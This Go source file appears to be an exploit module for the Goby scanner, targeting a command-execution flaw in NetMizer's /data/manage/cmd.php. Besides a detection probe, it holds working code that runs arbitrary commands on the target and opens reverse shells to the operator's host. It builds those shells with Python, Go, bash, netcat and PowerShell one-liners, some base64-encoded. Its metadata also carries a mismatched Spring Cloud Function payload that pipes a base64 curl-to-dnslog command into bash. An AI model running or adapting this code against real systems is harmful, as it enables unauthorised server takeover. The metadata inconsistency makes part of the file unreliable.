package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Netmizer Traffic Management System /data/manage/cmd.php Command Execution Vulnerability",
    "Description": "<p>NetMizer is a log management and Security Information Event Management (SIEM) system that collects, analyzes, and reports log data from network devices, servers, and other IT infrastructure. </p><p> A remote command execution vulnerability exists in the NetMizer log management system, cmd.php, which can be executed by passing the cmd parameter.</p>",
    "Product": "NetMizer-Log-MS",
    "Homepage": "http://www.netmizer.com.cn/",
    "DisclosureDate": "2023-11-08",
    "PostTime": "2024-08-08",
    "Author": "zhangjingpei@baimaohui.net",
    "FofaQuery": "body=\"日志管理系统\" && body=\"NetMizer\"",
    "GobyQuery": "body=\"日志管理系统\" && body=\"NetMizer\"",
    "Level": "3",
    "Impact": "<p>A code execution vulnerability exists in the NetMizer log management system, which can be exploited to execute arbitrary code on the server side, write a backdoor, gain server privileges, and then take control of the entire web server.</p>",
    "Recommendation": "<p>Upgrade to a secure version</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/functionRouter",
                "follow_redirect": true,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en,",
                    "Content-Length": "4",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Spring.cloud.function.routing-Expression": "T(java.lang.Runtime).getRuntime().exec(bash -c {echo,Y3VybCAwYmE2MTljOC5sb2cuZG5zbG9nLmJpei4=}|{base64,-d}|{bash,-i})",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
                },
                "data_type": "text",
                "data": "test"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"path\":\"/functionRouter\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "Netmizer 流量管理系统 /data/manage/cmd.php 命令执行漏洞",
            "Product": "NetMizer-日志管理系统",
            "Description": "<p>NetMizer是一个日志管理和安全信息事件管理（SIEM）系统，它主要用于收集、分析和报告来自网络设备、服务器和其他IT基础设施的日志数据。<br></p><p>NetMizer 日志管理系统 cmd.php 中存在远程命令执行漏洞，攻击者通过传入 cmd 参数即可命令执行</p><h2></h2>",
            "Recommendation": "<p>更新至安全版本</p>",
            "Impact": "<p>NetMizer 日志管理系统 存在代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写⼊后门，获取服务器权限，进而控制整个 web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "两高一弱",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Netmizer Traffic Management System /data/manage/cmd.php Command Execution Vulnerability",
            "Product": "NetMizer-Log-MS",
            "Description": "<p>NetMizer is a log management and Security Information Event Management (SIEM) system that collects, analyzes, and reports log data from network devices, servers, and other IT infrastructure.&nbsp;</p><p>&nbsp;A remote command execution vulnerability exists in the NetMizer log management system, cmd.php, which can be executed by passing the cmd parameter.<br></p>",
            "Recommendation": "<p>Upgrade to a secure version<br></p>",
            "Impact": "<p>A code execution vulnerability exists in the NetMizer log management system, which can be exploited to execute arbitrary code on the server side, write a backdoor, gain server privileges, and then take control of the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "2H1W",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9924"
}`

	sendInitialPayload_POBHTFD4 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		//漏洞url地址
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"

		path := "/data/manage/cmd.php?cmd=" + url.QueryEscape(command)
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/39.0.2171.71Safari/537.36",
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip,deflate,br",
			"Connection":      "close",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil {
			return "", "", err
		}
		if !regexp.MustCompile(`(?s)<br>(.*)`).MatchString(resp.RawBody) {
			return "", "", fmt.Errorf("failed")
		}

		result := regexp.MustCompile(`(?s)<pre>(.*)`).FindStringSubmatch(resp.RawBody)[1]
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败

		//commandResult := resp.RawBody
		commandResult := result
		return commandResult, path, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := sendInitialPayload_POBHTFD4

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := sendInitialPayload_POBHTFD4

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				ReverseTcpByPython := func(rp string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + godclient.GetGodServerHost() + "," + rp + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
				}
				ReverseTcpByGo := func(rp string) string {
					return "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + godclient.GetGodServerHost() + ":" + rp + "\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPython":           ReverseTcpByPython,
					"ByGo":               ReverseTcpByGo,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
